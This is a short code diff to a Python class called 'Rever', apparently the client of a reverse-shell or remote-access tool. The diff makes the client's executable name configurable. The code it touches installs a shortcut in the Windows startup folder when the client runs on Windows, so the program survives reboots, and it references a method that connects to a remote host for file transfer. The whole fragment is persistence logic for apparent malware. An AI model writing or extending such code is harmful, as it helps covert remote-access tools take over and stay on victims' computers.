@@ -121,7 +121,7 @@ class Rever:
         :return: create the startup shortcut
         """
 
-        return backstuff.startup_shortcut(path, dir)
+        return backstuff.startup_shortcut(path, dir, dt.CLIENT_NAME)
 
     def connect_tofiletrans(self, host, port):
         """
@@ -165,8 +165,8 @@ class Rever:
         if it's windows
         if it's nt It'll create shortcut on start up
         """
-        if "client.exe" in os.listdir() and os.name == "nt":
-            self.shortcut("client.bat", dt.WIN_STARTUP_PATH)
+        if f"{dt.CLIENT_NAME}.exe" in os.listdir() and os.name == "nt":
+            self.shortcut(f"{dt.CLIENT_NAME}.bat", dt.WIN_STARTUP_PATH)
 
         """
         
